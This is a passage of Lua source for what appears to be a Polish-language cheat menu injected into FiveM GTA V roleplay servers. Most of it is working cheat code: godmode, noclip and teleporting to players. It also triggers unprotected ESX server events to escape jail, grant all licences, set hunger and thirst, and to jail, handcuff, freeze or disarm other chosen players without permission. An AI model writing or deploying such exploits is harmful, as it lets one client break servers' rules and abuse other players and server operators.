        KoGuSzEk.CreateSubMenu('TeleportMenu', 'KoGuSzEkV', '~w~~h~Teleport Menu')
        KoGuSzEk.CreateSubMenu('WeaponMenu', 'KoGuSzEkV', '~w~~h~Menu broni')
        KoGuSzEk.CreateSubMenu('AdvM', 'KoGuSzEkV', '~w~~h~Zaawansowane menu')
        KoGuSzEk.CreateSubMenu('MoneyMenu', 'KoGuSzEkV', '~w~~h~Menu pieniedzy')
        KoGuSzEk.CreateSubMenu('VehicleMenu', 'KoGuSzEkV', '~w~~h~Menu pojazdow')
        KoGuSzEk.CreateSubMenu('OnlinePlayerMenu', 'KoGuSzEkV', '~w~~h~Menu graczy online')
        KoGuSzEk.CreateSubMenu('ESXTriggersSelf', 'SelfMenu', '~w~~h~ESX Triggers Self')
        KoGuSzEk.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', '~w~~h~Opcje gracza')
        KoGuSzEk.CreateSubMenu('Destroyer', 'AdvM', '~w~~h~Rozpierdol menu')
		KoGuSzEk.CreateSubMenu('kogusz', 'KoGuSzEkV', '~w~~h~KoGuSzEk Addons')
		KoGuSzEk.CreateSubMenu('esxy', 'kogusz', '~w~~h~Esxy')
		KoGuSzEk.CreateSubMenu('pedy', 'kogusz', '~w~~h~Pedy')
		KoGuSzEk.CreateSubMenu('pogoda', 'kogusz', '~w~~h~Pogoda')
		KoGuSzEk.CreateSubMenu('richrp', 'kogusz', '~w~~h~RICHRP')
		KoGuSzEk.CreateSubMenu('wioskarp', 'kogusz', '~w~~h~WioskaRP')
		KoGuSzEk.CreateSubMenu('dzwieki', 'kogusz', '~w~~h~Dzwieki')
		KoGuSzEk.CreateSubMenu('itemy', 'kogusz', '~w~~h~Menu itemow')
        KoGuSzEk.CreateSubMenu('crds', 'KoGuSzEkV', '~w~~h~Napisy')
        KoGuSzEk.CreateSubMenu('ESXJobs', 'MoneyMenu', '~w~~h~ESX Jobs')
        KoGuSzEk.CreateSubMenu('ESXJobs2', 'PlayerOptionsMenu', '~w~~h~ESX Jobs Individual')
        KoGuSzEk.CreateSubMenu('ESXTriggerini', 'PlayerOptionsMenu', '~w~~h~ESX Triggers')
        KoGuSzEk.CreateSubMenu('Trollmenu', 'PlayerOptionsMenu', '~w~~h~Troll Menu')
        KoGuSzEk.CreateSubMenu('WeaponTypes', 'WeaponMenu', '~w~~h~Bronie')
        KoGuSzEk.CreateSubMenu('WeaponTypeSelection', 'WeaponTypes', '~w~~h~Bronie')
        KoGuSzEk.CreateSubMenu('WeaponOptions', 'WeaponTypeSelection', '~w~~h~Opcje broni')
        KoGuSzEk.CreateSubMenu('ModSelect', 'WeaponOptions', '~w~~h~Weapon Mod Options')
        KoGuSzEk.CreateSubMenu('CarTypes', 'VehicleMenu', '~w~~h~Vehicles')
        KoGuSzEk.CreateSubMenu('CarTypeSelection', 'CarTypes', '~w~~h~Moew :3')
        KoGuSzEk.CreateSubMenu('CarOptions', 'CarTypeSelection', '~w~~h~Car Options')
        KoGuSzEk.CreateSubMenu('MainTrailer', 'VehicleMenu', '~w~~h~Trailers to Attach')
        KoGuSzEk.CreateSubMenu('MainTrailerSel', 'MainTrailer', '~w~~h~Trailers Available')
        KoGuSzEk.CreateSubMenu('MainTrailerSpa', 'MainTrailerSel', '~w~~h~Trailer Options')
        KoGuSzEk.CreateSubMenu('GiveSingleWeaponPlayer', 'OnlinePlayerMenu', '~w~~h~Single Weapon Menu')
        KoGuSzEk.CreateSubMenu('ESPMenu', 'AdvM', '~w~~h~ESP Menu')
        KoGuSzEk.CreateSubMenu('LSC', 'VehicleMenu', '~w~~h~LSC Customs')
        KoGuSzEk.CreateSubMenu('tunings', 'LSC', '~w~~h~Visual Tuning')
        KoGuSzEk.CreateSubMenu('performance', 'LSC', '~w~~h~Performance Tuning')
        KoGuSzEk.CreateSubMenu('BoostMenu', 'VehicleMenu', '~w~~h~Vehicle Boost')
        KoGuSzEk.CreateSubMenu('SpawnPeds', 'Trollmenu', '~w~~h~Spawn Peds')
		KoGuSzEk.CreateSubMenu('modelezresp', 'Trollmenu', '~w~~h~Zresp modele')
        KoGuSzEk.CreateSubMenu('GCT', 'VehicleMenu', '~w~~h~Global Car Trolls')
        KoGuSzEk.CreateSubMenu('CsMenu', 'AdvM', '~w~~h~Crosshairs')
        for i, dE in pairs(bl) do
                  KoGuSzEk.CreateSubMenu(dE.id, 'tunings', dE.name)
            if dE.id == 'paint' then
                KoGuSzEk.CreateSubMenu('primary', dE.id, 'Primary Paint')
                KoGuSzEk.CreateSubMenu('secondary', dE.id, 'Secondary Paint')
                KoGuSzEk.CreateSubMenu('rimpaint', dE.id, 'Wheel Paint')
                KoGuSzEk.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                KoGuSzEk.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                KoGuSzEk.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                KoGuSzEk.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                KoGuSzEk.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                KoGuSzEk.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                KoGuSzEk.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                KoGuSzEk.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                KoGuSzEk.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                KoGuSzEk.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                KoGuSzEk.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                KoGuSzEk.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
        for i, dE in pairs(bm) do
            KoGuSzEk.CreateSubMenu(dE.id, 'performance', dE.name)
        end
        local SelectedPlayer
        while bw do
            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh, 0)
            for i, dE in pairs(bl) do
                if KoGuSzEk.IsMenuOpened('tunings') then
                    if bg then
                        if bi == 'neon' then
                            local r, g, b = table.unpack(bh)
                            SetVehicleNeonLightsColour(veh, r, g, b)
                            SetVehicleNeonLightEnabled(veh, 0, bk)
                            SetVehicleNeonLightEnabled(veh, 1, bk)
                            SetVehicleNeonLightEnabled(veh, 2, bk)
                            SetVehicleNeonLightEnabled(veh, 3, bk)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bi == 'paint' then
                            local dF, dG, dH, dI = table.unpack(bh)
                            SetVehicleColours(veh, dF, dG)
                            SetVehicleExtraColours(veh, dH, dI)
                            bg = false
                            bi = -1
                            bh = -1
                        else
                            if bk == 'rm' then
                                RemoveVehicleMod(veh, bi)
                                bg = false
                                bi = -1
                                bh = -1
                            else
                                SetVehicleMod(veh, bi, bh, false)
                                bg = false
                                bi = -1
                                bh = -1
                            end
                        end
                    end
                end
                if KoGuSzEk.IsMenuOpened(dE.id) then
                    if dE.id == 'wheeltypes' then
                        if KoGuSzEk.B('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif KoGuSzEk.B('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif KoGuSzEk.B('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif KoGuSzEk.B('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif KoGuSzEk.B('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif KoGuSzEk.B('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif KoGuSzEk.B('High End Wheels') then
                            SetVehicleWheelType(veh, 7)
                        end
                        KoGuSzEk.Display()
                    elseif dE.id == 'extra' then
                        local dJ = checkValidVehicleExtras()
                        for i, dE in pairs(dJ) do
                            if IsVehicleExtraTurnedOn(veh, i) then
                                pricestring = 'Zainstalowane'
                            else
                                pricestring = 'Not Installed'
                            end
                            if KoGuSzEk.B(dE.menuName, pricestring) then
                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                            end
                        end
                        KoGuSzEk.Display()
                    elseif dE.id == 'headlight' then
                        if KoGuSzEk.B('None') then
                            SetVehicleHeadlightsColour(veh, -1)
                        end
                        for dK, dE in pairs(bo) do
                            tp = GetVehicleHeadlightsColour(veh)
                            if tp == dE.id and not bg then
                                pricetext = 'Zainstalowane'
                            else
                                if bg and tp == dE.id then
                                    pricetext = 'Ogladanie'
                                else
                                    pricetext = 'Not Installed'
                                end
                            end
                            head = GetVehicleHeadlightsColour(veh)
                            if KoGuSzEk.B(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                                    oldhead = GetVehicleHeadlightsColour(veh)
                                    bh = table.pack(oldhead)
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = true
                                elseif bg and head == dE.id then
                                    ToggleVehicleMod(veh, 22, true)
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and head ~= dE.id then
                                    SetVehicleHeadlightsColour(veh, dE.id)
                                    bg = true
                                end
                            end
                        end
                        KoGuSzEk.Display()
                    elseif dE.id == 'licence' then
                        if KoGuSzEk.B('None') then
                            SetVehicleNumberPlateTextIndex(veh, 3)
                        end
                        for dK, dE in pairs(bn) do
                            tp = GetVehicleNumberPlateTextIndex(veh)
                            if tp == dE.id and not bg then
                                pricetext = 'Zainstalowane'
                            else
                                if bg and tp == dE.id then
                                    pricetext = 'Ogladanie'
                                else
                                    pricetext = 'Not Installed'
                                end
                            end
                            plate = GetVehicleNumberPlateTextIndex(veh)
                            if KoGuSzEk.B(dE.name, pricetext) then
                                if not bg then
                                    bi = 'headlight'
                                    bk = false
                                    oldhead = GetVehicleNumberPlateTextIndex(veh)
                                    bh = table.pack(oldhead)
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = true
                                elseif bg and plate == dE.id then
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and plate ~= dE.id then
                                    SetVehicleNumberPlateTextIndex(veh, dE.id)
                                    bg = true
                                end
                            end
                        end
                        KoGuSzEk.Display()
                    elseif dE.id == 'neon' then
                        if KoGuSzEk.B('None') then
                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
                            SetVehicleNeonLightEnabled(veh, 0, false)
                            SetVehicleNeonLightEnabled(veh, 1, false)
                            SetVehicleNeonLightEnabled(veh, 2, false)
                            SetVehicleNeonLightEnabled(veh, 3, false)
                        end
                        for i, dE in pairs(bq) do
                            colorr, colorg, colorb = table.unpack(dE)
                            r, g, b = GetVehicleNeonLightsColour(veh)
                            if
                                colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and
                                    not bg
                             then
                                pricestring = 'Zainstalowane'
                            else
                                if bg and colorr == r and colorg == g and colorb == b then
                                    pricestring = 'Ogladanie'
                                else
                                    pricestring = 'Not Installed'
                                end
                            end
                            if KoGuSzEk.B(i, pricestring) then
                                if not bg then
                                    bi = 'neon'
                                    bk = IsVehicleNeonLightEnabled(veh, 1)
                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
                                    bh = table.pack(oldr, oldg, oldb)
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = true
                                elseif bg and colorr == r and colorg == g and colorb == b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = false
                                    bi = -1
                                    bh = -1
                                elseif bg and colorr ~= r or colorg ~= g or colorb ~= b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    bg = true
                                end
                            end
                        end
                        KoGuSzEk.Display()
                    elseif dE.id == 'paint' then
                        if KoGuSzEk.MB('~h~~p~»~w~ Primary Paint', 'primary') then
                        elseif KoGuSzEk.MB('~h~~p~»~w~ Secondary Paint', 'secondary') then
                        elseif KoGuSzEk.MB('~h~~p~»~w~ Wheel Paint', 'rimpaint') then
                        end
                        KoGuSzEk.Display()
                    else
                        local az = checkValidVehicleMods(dE.id)
                        for i, dL in pairs(az) do
                            for dM, dN in pairs(bp) do
                                if dM == dE.name and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
                                    price = 'Not Installed'
                                elseif dM == dE.name and bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    price = 'Ogladanie'
                                elseif dM == dE.name and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    price = 'Zainstalowane'
                                end
                            end
                            if dL.menuName == '~h~~w~Stock' then
                            end
                            if dE.name == 'Horns' then
                                for dO, dP in pairs(bp) do
                                    if dP == ci - 1 then
                                        dL.menuName = dO
                                    end
                                end
                            end
                            if dL.menuName == 'NULL' then
                                dL.menuName = 'unknown'
                            end
                            if KoGuSzEk.B(dL.menuName) then
                                if not bg then
                                    bi = dE.id
                                    bh = GetVehicleMod(veh, dE.id)
                                    bg = true
                                    if dL.data.realIndex == -1 then
                                        bk = 'rm'
                                        RemoveVehicleMod(veh, dL.data.modid)
                                        bg = false
                                        bi = -1
                                        bh = -1
                                        bk = false
                                    else
                                        bk = false
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                    end
                                elseif bg and GetVehicleMod(veh, dE.id) == dL.data.realIndex then
                                    bg = false
                                    bi = -1
                                    bh = -1
                                    bk = false
                                    if dL.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dL.data.modid)
                                    else
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                    end
                                elseif bg and GetVehicleMod(veh, dE.id) ~= dL.data.realIndex then
                                    if dL.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dL.data.modid)
                                        bg = false
                                        bi = -1
                                        bh = -1
                                        bk = false
                                    else
                                        SetVehicleMod(veh, dE.id, dL.data.realIndex, false)
                                        bg = true
                                    end
                                end
                            end
                        end
                        KoGuSzEk.Display()
                    end
                end
            end
            for i, dE in pairs(bm) do
                if KoGuSzEk.IsMenuOpened(dE.id) then
                    if GetVehicleMod(veh, dE.id) == 0 then
                        pricestock = 'Not Installed'
                        price1 = 'Zainstalowane'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 1 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Zainstalowane'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 2 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Zainstalowane'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, dE.id) == 3 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Zainstalowane'
                    elseif GetVehicleMod(veh, dE.id) == -1 then
                        pricestock = 'Zainstalowane'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    end
                    if KoGuSzEk.B('Stock ' .. dE.name, pricestock) then
                        SetVehicleMod(veh, dE.id, -1)
                    elseif KoGuSzEk.B(dE.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, dE.id, 0)
                    elseif KoGuSzEk.B(dE.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, dE.id, 1)
                    elseif KoGuSzEk.B(dE.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, dE.id, 2)
                    elseif dE.id ~= 13 and dE.id ~= 12 and KoGuSzEk.B(dE.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, dE.id, 3)
                    end
                    KoGuSzEk.Display()
                end
            end
            if KoGuSzEk.IsMenuOpened('KoGuSzEkV') then
			
				
				
				if KoGuSzEk.c('~h~~r~Twoj nick: <FONT COLOR="#00f7ff">' .. GetPlayerName(PlayerId(-1)) .. '      ~g~Informacje ~p~->',
                        showinfo,
                        function(dR)
							crosshair = false
                            crosshairc = false
                            showinfo = dR
                        end
                    )
                 then
           
				
                elseif KoGuSzEk.MB('~h~~p~»~w~ Opcje Wlasne', 'SelfMenu') then
				
                elseif KoGuSzEk.MB('~h~~p~»~w~ Gracze Online', 'OnlinePlayerMenu') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Menu Teleportow', 'TeleportMenu') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Menu Pojazdow', 'VehicleMenu') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Menu Broni', 'WeaponMenu') then
				elseif KoGuSzEk.MB('~h~~p~» ~w~KoGuSzEk Addons', 'kogusz') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Menu Pieniedzy', 'MoneyMenu') then 
                elseif KoGuSzEk.MB('~h~~p~»~w~ Zaawansowane Menu', 'AdvM') then 
                elseif KoGuSzEk.MB('~h~~p~» ~y~Napisy', 'crds') then			
                elseif KoGuSzEk.B('~h~~p~» ~r~Panickey') then
				
                    triggerr = false
                end
                if triggerr then
                    KoGuSzEk.Display()
                end
            elseif KoGuSzEk.IsMenuOpened('SelfMenu') then
                if KoGuSzEk.MB('~h~~p~»~w~ ESX Triggers', 'ESXTriggersSelf') then
                elseif
                    KoGuSzEk.c(
                        '~h~~g~Godmode',
                        Godmode,
                        function(dR)
                            Godmode = dR
                        end
                    )
               
                 then
                elseif KoGuSzEk.B('~h~~y~Polowiczny ~g~Godmode') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        pizda(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(-1),
                        GetPedBoneIndex(GetPlayerPed(-1), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif
                    KoGuSzEk.c(
                        '~h~~g~Widocznosc gracza',
                        d4,
                        function(dR)
                            d4 = dR
                        end
                    )
                 then
                elseif KoGuSzEk.B('~h~~r~Samobojstwo') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif KoGuSzEk.B("~h~~g~Ulecz") then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif KoGuSzEk.B("~h~~w~Armor") then
                    SetPedArmour(PlayerPedId(-1), 200)
                elseif
                    KoGuSzEk.c(
                        '~h~Nieskonczona stamina',
                        InfStamina,
                        function(dR)
                            InfStamina = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~o~Termowizja',
                        bTherm,
                        function(bTherm)
                        end
                    )
                 then
                    therm = not therm
                    bTherm = therm
                    SetSeethrough(therm)
                elseif
                    KoGuSzEk.c(
                        '~h~Szybki Bieg',
                        fastrun,
                        function(dR)
                            fastrun = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Super Skok',
                        SuperJump,
                        function(dR)
                            SuperJump = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Noclip',
                        Noclip,
                        function(dR)
                            Noclip = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('OnlinePlayerMenu') then
                for i = 0, 128 do
                    if
                        NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and
                            KoGuSzEk.MB(
                                '~p~» ~w~' .. GetPlayerName(i) .. ' ~p~[' .. GetPlayerServerId(i) .. ']~w~ ~y~[' ..
                                i .. ']~w~ ' .. (IsPedDeadOrDying(GetPlayerPed(i), 1) and '~h~~r~ZGON' or
                                '~h~~g~ZYJE'),
                                'PlayerOptionsMenu'
                            )
                     then
                        SelectedPlayer = i
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('PlayerOptionsMenu') then
                KoGuSzEk.SetSubTitle('PlayerOptionsMenu', 'Opcje Gracza [' .. GetPlayerName(SelectedPlayer) .. ']')
				if KoGuSzEk.B('~h~SPECTUJ', cC and '~g~[SPECTUJESZ]') then
                    SpectatePlayer(SelectedPlayer)
				elseif KoGuSzEk.B('~h~Tepnij                         			~r~UWAGA') then
                    if cO then
                        local confirm = 'y'
                        if confirm == 'y' then
                            local Entity =
                                IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                                PlayerPedId(-1)
                            SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
							av('~h~~g~Przeteleportowano do gracza ~h~~w~: ~h~~p~' .. GetPlayerName(SelectedPlayer) .. ' ')
                        elseif confirm == 'n' then
                            av('~h~~w~Operation cancelled~w~.', false)
                        else
                            av('~h~~w~Invalid Confirmation~w~.', true)
                            av('~h~~w~Operation cancelled~w~.', false)
                        end
                    else
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                    end
                elseif KoGuSzEk.MB('~h~~p~»~w~ Beka.exe', 'Trollmenu') then
				elseif KoGuSzEk.B('~h~~g~Revive') then
				local ax = GetPlayerPed(SelectedPlayer)
                    local bK = GetEntityCoords(ax)
                    
                    local dZ = {
                        x = ESX.Math.Round(bK.x, 1),
                        y = ESX.Math.Round(bK.y, 1),
                        z = ESX.Math.Round(bK.z, 1)
                    }
                    RespawnPed(ax, dZ, 0.0)
                    TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
				 elseif KoGuSzEk.B('~h~~b~Zakuj gracza') then
                    TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
                elseif KoGuSzEk.B('~h~~r~Polowiczna niesmiertelnosc') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        pizda(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(SelectedPlayer),
                        GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif KoGuSzEk.B('~h~~g~Ulecz ~w~Gracza') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = GetHashKey(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif KoGuSzEk.B('~h~~w~Dodaj ~w~armor') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif KoGuSzEk.B('~h~~w~Dodaj full ~w~Armoru') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = GetHashKey(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
                
                elseif
                    KoGuSzEk.c(
                        '~h~Zamroz gracza',
                        freezeplayer,
                        function(dR)
                            freezeplayer = dR
                        end
                    )
                 then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Dodaj bron', 'GiveSingleWeaponPlayer') then
                elseif KoGuSzEk.B('~h~Dodaj ~r~Wszystkie bronie') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif KoGuSzEk.B('~h~Usun ~r~wszystkie bronie') then
                    RemoveAllPedWeapons(PlayerPedId(SelectedPlayer), true)
                elseif KoGuSzEk.B('~h~Daj ~r~Auto') then
                    local ped = GetPlayerPed(SelectedPlayer)
                    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
                    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
                        pizda(cb)
                        while not HasModelLoaded(cb) do
                            Citizen.Wait(0)
                        end
                        local veh =
                            CreateVehicle(GetHashKey(cb), GetEntityCoords(ped), GetEntityHeading(ped) + 90, true, true)
                    else
                        av('~w~Model is not valid!', true)
                    end
                elseif KoGuSzEk.B('~h~Wyslij do ~r~Wiezienia') then
                    TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(selectedPlayer), 5000, 'KoGuSzEkV')
                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(selectedPlayer), 45 * 60)
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(selectedPlayer), 45 * 60, 'KoGuSzEkV')
                elseif KoGuSzEk.B('~h~~g~Wyciagnij ~w~z Wiezienia') then
                    TriggerServerEvent('esx-qalle-jail:unJailPlayer', GetPlayerServerId(SelectedPlayer))
                    TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(SelectedPlayer), 0)
                    TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(SelectedPlayer), 0)
                    TriggerServerEvent('js:jailuser', GetPlayerServerId(SelectedPlayer), 0, 'escaperino')
                elseif KoGuSzEk.B('~h~Wyslij do ~r~Community Service') then
                    TriggerServerEvent('esx_communityservice:sendToCommunityService', GetPlayerServerId(SelectedPlayer), 60)
                elseif KoGuSzEk.B('~h~~g~Wyciagnij ~w~z ~r~Community Service') then
                    TriggerServerEvent('esx_communityservice:endCommunityServiceCommand', GetPlayerServerId(SelectedPlayer))
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('ESXTriggersSelf') then
                    if KoGuSzEk.B('~h~~g~ESX ~w~Revive Siebie~w~') then
                        TriggerServerEvent('esx_ambulancejob:revive')
                        TriggerServerEvent('ambulancier:selfRespawn')
                    elseif KoGuSzEk.B('~h~~g~ESX ~w~Otworz menu wiezienia~w~') then
                        TriggerServerEvent("esx-qalle-jail:openJailMenu")
                    elseif KoGuSzEk.B("~h~~g~ESX ~w~Wyciagnij ~r~z wiezienia") then
                        TriggerServerEvent('esx_jailer:unjailTime', -1)
                        TriggerServerEvent('JailUpdate', 0)
                        TriggerServerEvent('UnJP')
                        TriggerServerEvent('esx-qalle-jail:unJailPlayer')
                    elseif KoGuSzEk.B("~h~~g~ESX ~w~Wyciagnij z ~r~Community Service") then
                        TriggerServerEvent('esx_communityservice:finishCommunityService')
                    elseif KoGuSzEk.B("~h~Najedz") then
                        TriggerServerEvent("esx_status:set", "hunger", 1000000)
                    elseif KoGuSzEk.B("~h~Napoj") then
                        TriggerServerEvent("esx_status:set", "thirst", 1000000)
                    end
				KoGuSzEk.Display()
					elseif KoGuSzEk.IsMenuOpened('esxy') then
							if KoGuSzEk.B('~h~~g~ESX ~w~Revive Yourself~w~') then
                        TriggerServerEvent('esx_ambulancejob:revive')
                        TriggerServerEvent('ambulancier:selfRespawn')
					elseif KoGuSzEk.B('~h~~g~Jail ~w~Edited~w~') then
						av ('Zmien trigger jaki ma wyspa')
					elseif KoGuSzEk.B('~h~~g~Plasterek gracza ~w~Obok~w~') then
						TriggerServerEvent('esx_ambulancejob:heal', GetPlayerServerId(closestPlayer), 'big')
					elseif KoGuSzEk.B('~h~~g~Zbierz Karnister') then
						TriggerServerEvent('esx_mecanojob:startHarvest')
					elseif KoGuSzEk.B('~h~~g~Zbierz Czesci Naprawcze') then
						TriggerServerEvent('esx_mecanojob:startHarvest2')
					elseif KoGuSzEk.B('~h~~g~Przerob na Palnik') then
						TriggerServerEvent('~h~~g~esx_mecanojob:startCraft')
					elseif KoGuSzEk.B("Dodaj wszystkie licencje ") then
					TriggerServerEvent("dmv:success")
					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
